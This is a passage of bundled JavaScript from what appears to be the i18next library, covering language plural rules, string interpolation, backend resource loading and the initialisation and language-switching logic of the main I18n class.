                    return Number(1 == n ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2);
                },
                8: function (n) {
                    return Number(1 == n ? 0 : 2 == n ? 1 : 8 != n && 11 != n ? 2 : 3);
                },
                9: function (n) {
                    return Number(n >= 2);
                },
                10: function (n) {
                    return Number(1 == n ? 0 : 2 == n ? 1 : n < 7 ? 2 : n < 11 ? 3 : 4);
                },
                11: function (n) {
                    return Number(1 == n || 11 == n ? 0 : 2 == n || 12 == n ? 1 : n > 2 && n < 20 ? 2 : 3);
                },
                12: function (n) {
                    return Number(n % 10 != 1 || n % 100 == 11);
                },
                13: function (n) {
                    return Number(0 !== n);
                },
                14: function (n) {
                    return Number(1 == n ? 0 : 2 == n ? 1 : 3 == n ? 2 : 3);
                },
                15: function (n) {
                    return Number(n % 10 == 1 && n % 100 != 11 ? 0 : n % 10 >= 2 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2);
                },
                16: function (n) {
                    return Number(n % 10 == 1 && n % 100 != 11 ? 0 : 0 !== n ? 1 : 2);
                },
                17: function (n) {
                    return Number(1 == n || (n % 10 == 1 && n % 100 != 11) ? 0 : 1);
                },
                18: function (n) {
                    return Number(0 == n ? 0 : 1 == n ? 1 : 2);
                },
                19: function (n) {
                    return Number(1 == n ? 0 : 0 == n || (n % 100 > 1 && n % 100 < 11) ? 1 : n % 100 > 10 && n % 100 < 20 ? 2 : 3);
                },
                20: function (n) {
                    return Number(1 == n ? 0 : 0 == n || (n % 100 > 0 && n % 100 < 20) ? 1 : 2);
                },
                21: function (n) {
                    return Number(n % 100 == 1 ? 1 : n % 100 == 2 ? 2 : n % 100 == 3 || n % 100 == 4 ? 3 : 0);
                },
                22: function (n) {
                    return Number(1 == n ? 0 : 2 == n ? 1 : (n < 0 || n > 10) && n % 10 == 0 ? 2 : 3);
                },
            };
        function createRules() {
            var rules = {};
            return (
                i18next_sets.forEach(function (set) {
                    set.lngs.forEach(function (l) {
                        rules[l] = { numbers: set.nr, plurals: _rulesPluralsTypes[set.fc] };
                    });
                }),
                rules
            );
        }
        var i18next_PluralResolver = (function () {
                function PluralResolver(languageUtils) {
                    var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    _classCallCheck(this, PluralResolver), (this.languageUtils = languageUtils), (this.options = options), (this.logger = baseLogger.create("pluralResolver")), (this.rules = createRules());
                }
                return (
                    _createClass(PluralResolver, [
                        {
                            key: "addRule",
                            value: function (lng, obj) {
                                this.rules[lng] = obj;
                            },
                        },
                        {
                            key: "getRule",
                            value: function (code) {
                                return this.rules[code] || this.rules[this.languageUtils.getLanguagePartFromCode(code)];
                            },
                        },
                        {
                            key: "needsPlural",
                            value: function (code) {
                                var rule = this.getRule(code);
                                return rule && rule.numbers.length > 1;
                            },
                        },
                        {
                            key: "getPluralFormsOfKey",
                            value: function (code, key) {
                                return this.getSuffixes(code).map(function (suffix) {
                                    return key + suffix;
                                });
                            },
                        },
                        {
                            key: "getSuffixes",
                            value: function (code) {
                                var _this = this,
                                    rule = this.getRule(code);
                                return rule
                                    ? rule.numbers.map(function (number) {
                                          return _this.getSuffix(code, number);
                                      })
                                    : [];
                            },
                        },
                        {
                            key: "getSuffix",
                            value: function (code, count) {
                                var _this2 = this,
                                    rule = this.getRule(code);
                                if (rule) {
                                    var idx = rule.noAbs ? rule.plurals(count) : rule.plurals(Math.abs(count)),
                                        suffix = rule.numbers[idx];
                                    this.options.simplifyPluralSuffix && 2 === rule.numbers.length && 1 === rule.numbers[0] && (2 === suffix ? (suffix = "plural") : 1 === suffix && (suffix = ""));
                                    var returnSuffix = function () {
                                        return _this2.options.prepend && suffix.toString() ? _this2.options.prepend + suffix.toString() : suffix.toString();
                                    };
                                    return "v1" === this.options.compatibilityJSON
                                        ? 1 === suffix
                                            ? ""
                                            : "number" == typeof suffix
                                            ? "_plural_".concat(suffix.toString())
                                            : returnSuffix()
                                        : "v2" === this.options.compatibilityJSON || (this.options.simplifyPluralSuffix && 2 === rule.numbers.length && 1 === rule.numbers[0])
                                        ? returnSuffix()
                                        : this.options.prepend && idx.toString()
                                        ? this.options.prepend + idx.toString()
                                        : idx.toString();
                                }
                                return this.logger.warn("no plural rule found for: ".concat(code)), "";
                            },
                        },
                    ]),
                    PluralResolver
                );
            })(),
            i18next_Interpolator = (function () {
                function Interpolator() {
                    var options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    _classCallCheck(this, Interpolator),
                        (this.logger = baseLogger.create("interpolator")),
                        (this.options = options),
                        (this.format =
                            (options.interpolation && options.interpolation.format) ||
                            function (value) {
                                return value;
                            }),
                        this.init(options);
                }
                return (
                    _createClass(Interpolator, [
                        {
                            key: "init",
                            value: function () {
                                var options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                                options.interpolation || (options.interpolation = { escapeValue: !0 });
                                var iOpts = options.interpolation;
                                (this.escape = void 0 !== iOpts.escape ? iOpts.escape : i18next_escape),
                                    (this.escapeValue = void 0 === iOpts.escapeValue || iOpts.escapeValue),
                                    (this.useRawValueToEscape = void 0 !== iOpts.useRawValueToEscape && iOpts.useRawValueToEscape),
                                    (this.prefix = iOpts.prefix ? regexEscape(iOpts.prefix) : iOpts.prefixEscaped || "{{"),
                                    (this.suffix = iOpts.suffix ? regexEscape(iOpts.suffix) : iOpts.suffixEscaped || "}}"),
                                    (this.formatSeparator = iOpts.formatSeparator ? iOpts.formatSeparator : iOpts.formatSeparator || ","),
                                    (this.unescapePrefix = iOpts.unescapeSuffix ? "" : iOpts.unescapePrefix || "-"),
                                    (this.unescapeSuffix = this.unescapePrefix ? "" : iOpts.unescapeSuffix || ""),
                                    (this.nestingPrefix = iOpts.nestingPrefix ? regexEscape(iOpts.nestingPrefix) : iOpts.nestingPrefixEscaped || regexEscape("$t(")),
                                    (this.nestingSuffix = iOpts.nestingSuffix ? regexEscape(iOpts.nestingSuffix) : iOpts.nestingSuffixEscaped || regexEscape(")")),
                                    (this.nestingOptionsSeparator = iOpts.nestingOptionsSeparator ? iOpts.nestingOptionsSeparator : iOpts.nestingOptionsSeparator || ","),
                                    (this.maxReplaces = iOpts.maxReplaces ? iOpts.maxReplaces : 1e3),
                                    (this.alwaysFormat = void 0 !== iOpts.alwaysFormat && iOpts.alwaysFormat),
                                    this.resetRegExp();
                            },
                        },
                        {
                            key: "reset",
                            value: function () {
                                this.options && this.init(this.options);
                            },
                        },
                        {
                            key: "resetRegExp",
                            value: function () {
                                var regexpStr = "".concat(this.prefix, "(.+?)").concat(this.suffix);
                                this.regexp = new RegExp(regexpStr, "g");
                                var regexpUnescapeStr = "".concat(this.prefix).concat(this.unescapePrefix, "(.+?)").concat(this.unescapeSuffix).concat(this.suffix);
                                this.regexpUnescape = new RegExp(regexpUnescapeStr, "g");
                                var nestingRegexpStr = "".concat(this.nestingPrefix, "(.+?)").concat(this.nestingSuffix);
                                this.nestingRegexp = new RegExp(nestingRegexpStr, "g");
                            },
                        },
                        {
                            key: "interpolate",
                            value: function (str, data, lng, options) {
                                var match,
                                    value,
                                    replaces,
                                    _this = this,
                                    defaultData = (this.options && this.options.interpolation && this.options.interpolation.defaultVariables) || {};
                                function regexSafe(val) {
                                    return val.replace(/\$/g, "$$$$");
                                }
                                var handleFormat = function (key) {
                                    if (key.indexOf(_this.formatSeparator) < 0) {
                                        var path = getPathWithDefaults(data, defaultData, key);
                                        return _this.alwaysFormat ? _this.format(path, void 0, lng) : path;
                                    }
                                    var p = key.split(_this.formatSeparator),
                                        k = p.shift().trim(),
                                        f = p.join(_this.formatSeparator).trim();
                                    return _this.format(getPathWithDefaults(data, defaultData, k), f, lng, options);
                                };
                                this.resetRegExp();
                                var missingInterpolationHandler = (options && options.missingInterpolationHandler) || this.options.missingInterpolationHandler,
                                    skipOnVariables = (options && options.interpolation && options.interpolation.skipOnVariables) || this.options.interpolation.skipOnVariables;
                                return (
                                    [
                                        {
                                            regex: this.regexpUnescape,
                                            safeValue: function (val) {
                                                return regexSafe(val);
                                            },
                                        },
                                        {
                                            regex: this.regexp,
                                            safeValue: function (val) {
                                                return _this.escapeValue ? regexSafe(_this.escape(val)) : regexSafe(val);
                                            },
                                        },
                                    ].forEach(function (todo) {
                                        for (replaces = 0; (match = todo.regex.exec(str)); ) {
                                            if (void 0 === (value = handleFormat(match[1].trim())))
                                                if ("function" == typeof missingInterpolationHandler) {
                                                    var temp = missingInterpolationHandler(str, match, options);
                                                    value = "string" == typeof temp ? temp : "";
                                                } else {
                                                    if (skipOnVariables) {
                                                        value = match[0];
                                                        continue;
                                                    }
                                                    _this.logger.warn("missed to pass in variable ".concat(match[1], " for interpolating ").concat(str)), (value = "");
                                                }
                                            else "string" == typeof value || _this.useRawValueToEscape || (value = makeString(value));
                                            if (((str = str.replace(match[0], todo.safeValue(value))), (todo.regex.lastIndex = 0), ++replaces >= _this.maxReplaces)) break;
                                        }
                                    }),
                                    str
                                );
                            },
                        },
                        {
                            key: "nest",
                            value: function (str, fc) {
                                var match,
                                    value,
                                    _this2 = this,
                                    options = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
                                    clonedOptions = objectSpread_objectSpread({}, options);
                                function handleHasOptions(key, inheritedOptions) {
                                    var sep = this.nestingOptionsSeparator;
                                    if (key.indexOf(sep) < 0) return key;
                                    var c = key.split(new RegExp("".concat(sep, "[ ]*{"))),
                                        optionsString = "{".concat(c[1]);
                                    (key = c[0]), (optionsString = (optionsString = this.interpolate(optionsString, clonedOptions)).replace(/'/g, '"'));
                                    try {
                                        (clonedOptions = JSON.parse(optionsString)), inheritedOptions && (clonedOptions = objectSpread_objectSpread({}, inheritedOptions, clonedOptions));
                                    } catch (e) {
                                        return this.logger.warn("failed parsing options string in nesting for key ".concat(key), e), "".concat(key).concat(sep).concat(optionsString);
                                    }
                                    return delete clonedOptions.defaultValue, key;
                                }
                                for (clonedOptions.applyPostProcessor = !1, delete clonedOptions.defaultValue; (match = this.nestingRegexp.exec(str)); ) {
                                    var formatters = [],
                                        doReduce = !1;
                                    if (match[0].includes(this.formatSeparator) && !/{.*}/.test(match[1])) {
                                        var r = match[1].split(this.formatSeparator).map(function (elem) {
                                            return elem.trim();
                                        });
                                        (match[1] = r.shift()), (formatters = r), (doReduce = !0);
                                    }
                                    if ((value = fc(handleHasOptions.call(this, match[1].trim(), clonedOptions), clonedOptions)) && match[0] === str && "string" != typeof value) return value;
                                    "string" != typeof value && (value = makeString(value)),
                                        value || (this.logger.warn("missed to resolve ".concat(match[1], " for nesting ").concat(str)), (value = "")),
                                        doReduce &&
                                            (value = formatters.reduce(function (v, f) {
                                                return _this2.format(v, f, options.lng, options);
                                            }, value.trim())),
                                        (str = str.replace(match[0], value)),
                                        (this.regexp.lastIndex = 0);
                                }
                                return str;
                            },
                        },
                    ]),
                    Interpolator
                );
            })();
        var i18next_Connector = (function (_EventEmitter) {
            function Connector(backend, store, services) {
                var _this,
                    options = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                return (
                    _classCallCheck(this, Connector),
                    (_this = _possibleConstructorReturn(this, _getPrototypeOf(Connector).call(this))),
                    isIE10 && i18next_EventEmitter.call(_assertThisInitialized(_this)),
                    (_this.backend = backend),
                    (_this.store = store),
                    (_this.services = services),
                    (_this.languageUtils = services.languageUtils),
                    (_this.options = options),
                    (_this.logger = baseLogger.create("backendConnector")),
                    (_this.state = {}),
                    (_this.queue = []),
                    _this.backend && _this.backend.init && _this.backend.init(services, options.backend, options),
                    _this
                );
            }
            return (
                _inherits(Connector, _EventEmitter),
                _createClass(Connector, [
                    {
                        key: "queueLoad",
                        value: function (languages, namespaces, options, callback) {
                            var _this2 = this,
                                toLoad = [],
                                pending = [],
                                toLoadLanguages = [],
                                toLoadNamespaces = [];
                            return (
                                languages.forEach(function (lng) {
                                    var hasAllNamespaces = !0;
                                    namespaces.forEach(function (ns) {
                                        var name = "".concat(lng, "|").concat(ns);
                                        !options.reload && _this2.store.hasResourceBundle(lng, ns)
                                            ? (_this2.state[name] = 2)
                                            : _this2.state[name] < 0 ||
                                              (1 === _this2.state[name]
                                                  ? pending.indexOf(name) < 0 && pending.push(name)
                                                  : ((_this2.state[name] = 1),
                                                    (hasAllNamespaces = !1),
                                                    pending.indexOf(name) < 0 && pending.push(name),
                                                    toLoad.indexOf(name) < 0 && toLoad.push(name),
                                                    toLoadNamespaces.indexOf(ns) < 0 && toLoadNamespaces.push(ns)));
                                    }),
                                        hasAllNamespaces || toLoadLanguages.push(lng);
                                }),
                                (toLoad.length || pending.length) && this.queue.push({ pending: pending, loaded: {}, errors: [], callback: callback }),
                                { toLoad: toLoad, pending: pending, toLoadLanguages: toLoadLanguages, toLoadNamespaces: toLoadNamespaces }
                            );
                        },
                    },
                    {
                        key: "loaded",
                        value: function (name, err, data) {
                            var s = name.split("|"),
                                lng = s[0],
                                ns = s[1];
                            err && this.emit("failedLoading", lng, ns, err), data && this.store.addResourceBundle(lng, ns, data), (this.state[name] = err ? -1 : 2);
                            var loaded = {};
                            this.queue.forEach(function (q) {
                                var object, newValue, concat, _getLastOfPath2, obj, k;
                                (object = q.loaded),
                                    (newValue = ns),
                                    (_getLastOfPath2 = getLastOfPath(object, [lng], Object)),
                                    (obj = _getLastOfPath2.obj),
                                    (k = _getLastOfPath2.k),
                                    (obj[k] = obj[k] || []),
                                    concat && (obj[k] = obj[k].concat(newValue)),
                                    concat || obj[k].push(newValue),
                                    (function (arr, what) {
                                        for (var found = arr.indexOf(what); -1 !== found; ) arr.splice(found, 1), (found = arr.indexOf(what));
                                    })(q.pending, name),
                                    err && q.errors.push(err),
                                    0 !== q.pending.length ||
                                        q.done ||
                                        (Object.keys(q.loaded).forEach(function (l) {
                                            loaded[l] || (loaded[l] = []),
                                                q.loaded[l].length &&
                                                    q.loaded[l].forEach(function (ns) {
                                                        loaded[l].indexOf(ns) < 0 && loaded[l].push(ns);
                                                    });
                                        }),
                                        (q.done = !0),
                                        q.errors.length ? q.callback(q.errors) : q.callback());
                            }),
                                this.emit("loaded", loaded),
                                (this.queue = this.queue.filter(function (q) {
                                    return !q.done;
                                }));
                        },
                    },
                    {
                        key: "read",
                        value: function (lng, ns, fcName) {
                            var _this3 = this,
                                tried = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 0,
                                wait = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 350,
                                callback = arguments.length > 5 ? arguments[5] : void 0;
                            return lng.length
                                ? this.backend[fcName](lng, ns, function (err, data) {
                                      err && data && tried < 5
                                          ? setTimeout(function () {
                                                _this3.read.call(_this3, lng, ns, fcName, tried + 1, 2 * wait, callback);
                                            }, wait)
                                          : callback(err, data);
                                  })
                                : callback(null, {});
                        },
                    },
                    {
                        key: "prepareLoading",
                        value: function (languages, namespaces) {
                            var _this4 = this,
                                options = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
                                callback = arguments.length > 3 ? arguments[3] : void 0;
                            if (!this.backend) return this.logger.warn("No backend was added via i18next.use. Will not load resources."), callback && callback();
                            "string" == typeof languages && (languages = this.languageUtils.toResolveHierarchy(languages)), "string" == typeof namespaces && (namespaces = [namespaces]);
                            var toLoad = this.queueLoad(languages, namespaces, options, callback);
                            if (!toLoad.toLoad.length) return toLoad.pending.length || callback(), null;
                            toLoad.toLoad.forEach(function (name) {
                                _this4.loadOne(name);
                            });
                        },
                    },
                    {
                        key: "load",
                        value: function (languages, namespaces, callback) {
                            this.prepareLoading(languages, namespaces, {}, callback);
                        },
                    },
                    {
                        key: "reload",
                        value: function (languages, namespaces, callback) {
                            this.prepareLoading(languages, namespaces, { reload: !0 }, callback);
                        },
                    },
                    {
                        key: "loadOne",
                        value: function (name) {
                            var _this5 = this,
                                prefix = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
                                s = name.split("|"),
                                lng = s[0],
                                ns = s[1];
                            this.read(lng, ns, "read", void 0, void 0, function (err, data) {
                                err && _this5.logger.warn("".concat(prefix, "loading namespace ").concat(ns, " for language ").concat(lng, " failed"), err),
                                    !err && data && _this5.logger.log("".concat(prefix, "loaded namespace ").concat(ns, " for language ").concat(lng), data),
                                    _this5.loaded(name, err, data);
                            });
                        },
                    },
                    {
                        key: "saveMissing",
                        value: function (languages, namespace, key, fallbackValue, isUpdate) {
                            var options = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : {};
                            this.services.utils && this.services.utils.hasLoadedNamespace && !this.services.utils.hasLoadedNamespace(namespace)
                                ? this.logger.warn(
                                      'did not save key "'.concat(key, '" as the namespace "').concat(namespace, '" was not yet loaded'),
                                      "This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!"
                                  )
                                : null != key &&
                                  "" !== key &&
                                  (this.backend && this.backend.create && this.backend.create(languages, namespace, key, fallbackValue, null, objectSpread_objectSpread({}, options, { isUpdate: isUpdate })),
                                  languages && languages[0] && this.store.addResource(languages[0], namespace, key, fallbackValue));
                        },
                    },
                ]),
                Connector
            );
        })(i18next_EventEmitter);
        function i18next_get() {
            return {
                debug: !1,
                initImmediate: !0,
                ns: ["translation"],
                defaultNS: ["translation"],
                fallbackLng: ["dev"],
                fallbackNS: !1,
                whitelist: !1,
                nonExplicitWhitelist: !1,
                supportedLngs: !1,
                nonExplicitSupportedLngs: !1,
                load: "all",
                preload: !1,
                simplifyPluralSuffix: !0,
                keySeparator: ".",
                nsSeparator: ":",
                pluralSeparator: "_",
                contextSeparator: "_",
                partialBundledLanguages: !1,
                saveMissing: !1,
                updateMissing: !1,
                saveMissingTo: "fallback",
                saveMissingPlurals: !0,
                missingKeyHandler: !1,
                missingInterpolationHandler: !1,
                postProcess: !1,
                postProcessPassResolved: !1,
                returnNull: !0,
                returnEmptyString: !0,
                returnObjects: !1,
                joinArrays: !1,
                returnedObjectHandler: !1,
                parseMissingKeyHandler: !1,
                appendNamespaceToMissingKey: !1,
                appendNamespaceToCIMode: !1,
                overloadTranslationOptionHandler: function (args) {
                    var ret = {};
                    if (
                        ("object" === _typeof(args[1]) && (ret = args[1]),
                        "string" == typeof args[1] && (ret.defaultValue = args[1]),
                        "string" == typeof args[2] && (ret.tDescription = args[2]),
                        "object" === _typeof(args[2]) || "object" === _typeof(args[3]))
                    ) {
                        var options = args[3] || args[2];
                        Object.keys(options).forEach(function (key) {
                            ret[key] = options[key];
                        });
                    }
                    return ret;
                },
                interpolation: {
                    escapeValue: !0,
                    format: function (value, _format, lng, options) {
                        return value;
                    },
                    prefix: "{{",
                    suffix: "}}",
                    formatSeparator: ",",
                    unescapePrefix: "-",
                    nestingPrefix: "$t(",
                    nestingSuffix: ")",
                    nestingOptionsSeparator: ",",
                    maxReplaces: 1e3,
                    skipOnVariables: !1,
                },
            };
        }
        function transformOptions(options) {
            return (
                "string" == typeof options.ns && (options.ns = [options.ns]),
                "string" == typeof options.fallbackLng && (options.fallbackLng = [options.fallbackLng]),
                "string" == typeof options.fallbackNS && (options.fallbackNS = [options.fallbackNS]),
                options.whitelist && (options.whitelist && options.whitelist.indexOf("cimode") < 0 && (options.whitelist = options.whitelist.concat(["cimode"])), (options.supportedLngs = options.whitelist)),
                options.nonExplicitWhitelist && (options.nonExplicitSupportedLngs = options.nonExplicitWhitelist),
                options.supportedLngs && options.supportedLngs.indexOf("cimode") < 0 && (options.supportedLngs = options.supportedLngs.concat(["cimode"])),
                options
            );
        }
        function i18next_noop() {}
        var esm_i18next = new ((function (_EventEmitter) {
                function I18n() {
                    var _this,
                        options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
                        callback = arguments.length > 1 ? arguments[1] : void 0;
                    if (
                        (_classCallCheck(this, I18n),
                        (_this = _possibleConstructorReturn(this, _getPrototypeOf(I18n).call(this))),
                        isIE10 && i18next_EventEmitter.call(_assertThisInitialized(_this)),
                        (_this.options = transformOptions(options)),
                        (_this.services = {}),
                        (_this.logger = baseLogger),
                        (_this.modules = { external: [] }),
                        callback && !_this.isInitialized && !options.isClone)
                    ) {
                        if (!_this.options.initImmediate) return _this.init(options, callback), _possibleConstructorReturn(_this, _assertThisInitialized(_this));
                        setTimeout(function () {
                            _this.init(options, callback);
                        }, 0);
                    }
                    return _this;
                }
                return (
                    _inherits(I18n, _EventEmitter),
                    _createClass(I18n, [
                        {
                            key: "init",
                            value: function () {
                                var _this2 = this,
                                    options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
                                    callback = arguments.length > 1 ? arguments[1] : void 0;
                                function createClassOnDemand(ClassOrObject) {
                                    return ClassOrObject ? ("function" == typeof ClassOrObject ? new ClassOrObject() : ClassOrObject) : null;
                                }
                                if (
                                    ("function" == typeof options && ((callback = options), (options = {})),
                                    options.whitelist && !options.supportedLngs && this.logger.deprecate("whitelist", 'option "whitelist" will be renamed to "supportedLngs" in the next major - please make sure to rename this option asap.'),
                                    options.nonExplicitWhitelist &&
                                        !options.nonExplicitSupportedLngs &&
                                        this.logger.deprecate("whitelist", 'options "nonExplicitWhitelist" will be renamed to "nonExplicitSupportedLngs" in the next major - please make sure to rename this option asap.'),
                                    (this.options = objectSpread_objectSpread({}, i18next_get(), this.options, transformOptions(options))),
                                    (this.format = this.options.interpolation.format),
                                    callback || (callback = i18next_noop),
                                    !this.options.isClone)
                                ) {
                                    this.modules.logger ? baseLogger.init(createClassOnDemand(this.modules.logger), this.options) : baseLogger.init(null, this.options);
                                    var lu = new i18next_LanguageUtil(this.options);
                                    this.store = new i18next_ResourceStore(this.options.resources, this.options);
                                    var s = this.services;
                                    (s.logger = baseLogger),
                                        (s.resourceStore = this.store),
                                        (s.languageUtils = lu),
                                        (s.pluralResolver = new i18next_PluralResolver(lu, {
                                            prepend: this.options.pluralSeparator,
                                            compatibilityJSON: this.options.compatibilityJSON,
                                            simplifyPluralSuffix: this.options.simplifyPluralSuffix,
                                        })),
                                        (s.interpolator = new i18next_Interpolator(this.options)),
                                        (s.utils = { hasLoadedNamespace: this.hasLoadedNamespace.bind(this) }),
                                        (s.backendConnector = new i18next_Connector(createClassOnDemand(this.modules.backend), s.resourceStore, s, this.options)),
                                        s.backendConnector.on("*", function (event) {
                                            for (var _len = arguments.length, args = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) args[_key - 1] = arguments[_key];
                                            _this2.emit.apply(_this2, [event].concat(args));
                                        }),
                                        this.modules.languageDetector && ((s.languageDetector = createClassOnDemand(this.modules.languageDetector)), s.languageDetector.init(s, this.options.detection, this.options)),
                                        this.modules.i18nFormat && ((s.i18nFormat = createClassOnDemand(this.modules.i18nFormat)), s.i18nFormat.init && s.i18nFormat.init(this)),
                                        (this.translator = new i18next_Translator(this.services, this.options)),
                                        this.translator.on("*", function (event) {
                                            for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) args[_key2 - 1] = arguments[_key2];
                                            _this2.emit.apply(_this2, [event].concat(args));
                                        }),
                                        this.modules.external.forEach(function (m) {
                                            m.init && m.init(_this2);
                                        });
                                }
                                if (this.options.fallbackLng && !this.services.languageDetector && !this.options.lng) {
                                    var codes = this.services.languageUtils.getFallbackCodes(this.options.fallbackLng);
                                    codes.length > 0 && "dev" !== codes[0] && (this.options.lng = codes[0]);
                                }
                                this.services.languageDetector || this.options.lng || this.logger.warn("init: no languageDetector is used and no lng is defined");
                                var storeApi = ["getResource", "hasResourceBundle", "getResourceBundle", "getDataByLanguage"];
                                storeApi.forEach(function (fcName) {
                                    _this2[fcName] = function () {
                                        var _this2$store;
                                        return (_this2$store = _this2.store)[fcName].apply(_this2$store, arguments);
                                    };
                                });
                                var storeApiChained = ["addResource", "addResources", "addResourceBundle", "removeResourceBundle"];
                                storeApiChained.forEach(function (fcName) {
                                    _this2[fcName] = function () {
                                        var _this2$store2;
                                        return (_this2$store2 = _this2.store)[fcName].apply(_this2$store2, arguments), _this2;
                                    };
                                });
                                var deferred = defer(),
                                    load = function () {
                                        var finish = function (err, t) {
                                            _this2.isInitialized && _this2.logger.warn("init: i18next is already initialized. You should call init just once!"),
                                                (_this2.isInitialized = !0),
                                                _this2.options.isClone || _this2.logger.log("initialized", _this2.options),
                                                _this2.emit("initialized", _this2.options),
                                                deferred.resolve(t),
                                                callback(err, t);
                                        };
                                        if (_this2.languages && "v1" !== _this2.options.compatibilityAPI && !_this2.isInitialized) return finish(null, _this2.t.bind(_this2));
                                        _this2.changeLanguage(_this2.options.lng, finish);
                                    };
                                return this.options.resources || !this.options.initImmediate ? load() : setTimeout(load, 0), deferred;
                            },
                        },
                        {
                            key: "loadResources",
                            value: function (language) {
                                var _this3 = this,
                                    callback = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : i18next_noop,
                                    usedCallback = callback,
                                    usedLng = "string" == typeof language ? language : this.language;
                                if (("function" == typeof language && (usedCallback = language), !this.options.resources || this.options.partialBundledLanguages)) {
                                    if (usedLng && "cimode" === usedLng.toLowerCase()) return usedCallback();
                                    var toLoad = [],
                                        append = function (lng) {
                                            lng &&
                                                _this3.services.languageUtils.toResolveHierarchy(lng).forEach(function (l) {
                                                    toLoad.indexOf(l) < 0 && toLoad.push(l);
                                                });
                                        };
                                    if (usedLng) append(usedLng);
                                    else {
                                        var fallbacks = this.services.languageUtils.getFallbackCodes(this.options.fallbackLng);
                                        fallbacks.forEach(function (l) {
                                            return append(l);
                                        });
                                    }
                                    this.options.preload &&
                                        this.options.preload.forEach(function (l) {
                                            return append(l);
                                        }),
                                        this.services.backendConnector.load(toLoad, this.options.ns, usedCallback);
                                } else usedCallback(null);
                            },
                        },
                        {
                            key: "reloadResources",
                            value: function (lngs, ns, callback) {
                                var deferred = defer();
                                return (
                                    lngs || (lngs = this.languages),
                                    ns || (ns = this.options.ns),
                                    callback || (callback = i18next_noop),
                                    this.services.backendConnector.reload(lngs, ns, function (err) {
                                        deferred.resolve(), callback(err);
                                    }),
                                    deferred
                                );
                            },
                        },
                        {
                            key: "use",
                            value: function (module) {
                                if (!module) throw new Error("You are passing an undefined module! Please check the object you are passing to i18next.use()");
                                if (!module.type) throw new Error("You are passing a wrong module! Please check the object you are passing to i18next.use()");
                                return (
                                    "backend" === module.type && (this.modules.backend = module),
                                    ("logger" === module.type || (module.log && module.warn && module.error)) && (this.modules.logger = module),
                                    "languageDetector" === module.type && (this.modules.languageDetector = module),
                                    "i18nFormat" === module.type && (this.modules.i18nFormat = module),
                                    "postProcessor" === module.type && postProcessor.addPostProcessor(module),
                                    "3rdParty" === module.type && this.modules.external.push(module),
                                    this
                                );
                            },
                        },
                        {
                            key: "changeLanguage",
                            value: function (lng, callback) {
                                var _this4 = this;
                                this.isLanguageChangingTo = lng;
                                var deferred = defer();
                                this.emit("languageChanging", lng);
                                var setLng = function (lngs) {
                                    var l = "string" == typeof lngs ? lngs : _this4.services.languageUtils.getBestMatchFromCodes(lngs);
                                    l &&
                                        (_this4.language || ((_this4.language = l), (_this4.languages = _this4.services.languageUtils.toResolveHierarchy(l))),
                                        _this4.translator.language || _this4.translator.changeLanguage(l),
                                        _this4.services.languageDetector && _this4.services.languageDetector.cacheUserLanguage(l)),
                                        _this4.loadResources(l, function (err) {
                                            !(function (err, l) {
                                                l
                                                    ? ((_this4.language = l),
                                                      (_this4.languages = _this4.services.languageUtils.toResolveHierarchy(l)),
                                                      _this4.translator.changeLanguage(l),
                                                      (_this4.isLanguageChangingTo = void 0),
                                                      _this4.emit("languageChanged", l),
                                                      _this4.logger.log("languageChanged", l))
                                                    : (_this4.isLanguageChangingTo = void 0),
                                                    deferred.resolve(function () {
                                                        return _this4.t.apply(_this4, arguments);
                                                    }),
                                                    callback &&
                                                        callback(err, function () {
                                                            return _this4.t.apply(_this4, arguments);
                                                        });
                                            })(err, l);
                                        });
                                };
                                return (
                                    lng || !this.services.languageDetector || this.services.languageDetector.async
                                        ? !lng && this.services.languageDetector && this.services.languageDetector.async
                                            ? this.services.languageDetector.detect(setLng)
                                            : setLng(lng)
                                        : setLng(this.services.languageDetector.detect()),
                                    deferred
                                );
                            },
                        },
                        {
                            key: "getFixedT",
                            value: function (lng, ns) {
                                var _this5 = this,
                                    fixedT = function fixedT(key, opts) {
                                        var options;
                                        if ("object" !== _typeof(opts)) {
                                            for (var _len3 = arguments.length, rest = new Array(_len3 > 2 ? _len3 - 2 : 0), _key3 = 2; _key3 < _len3; _key3++) rest[_key3 - 2] = arguments[_key3];
                                            options = _this5.options.overloadTranslationOptionHandler([key, opts].concat(rest));
                                        } else options = objectSpread_objectSpread({}, opts);
                                        return (options.lng = options.lng || fixedT.lng), (options.lngs = options.lngs || fixedT.lngs), (options.ns = options.ns || fixedT.ns), _this5.t(key, options);
                                    };
                                return "string" == typeof lng ? (fixedT.lng = lng) : (fixedT.lngs = lng), (fixedT.ns = ns), fixedT;
                            },
                        },
                        {
                            key: "t",
                            value: function () {
                                var _this$translator;
                                return this.translator && (_this$translator = this.translator).translate.apply(_this$translator, arguments);
                            },
                        },
                        {
                            key: "exists",
                            value: function () {
                                var _this$translator2;
                                return this.translator && (_this$translator2 = this.translator).exists.apply(_this$translator2, arguments);
                            },
                        },
                        {
                            key: "setDefaultNamespace",
                            value: function (ns) {
                                this.options.defaultNS = ns;
                            },
                        },
                        {
                            key: "hasLoadedNamespace",
                            value: function (ns) {
                                var _this6 = this,
                                    options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                                if (!this.isInitialized) return this.logger.warn("hasLoadedNamespace: i18next was not initialized", this.languages), !1;
                                if (!this.languages || !this.languages.length) return this.logger.warn("hasLoadedNamespace: i18n.languages were undefined or empty", this.languages), !1;
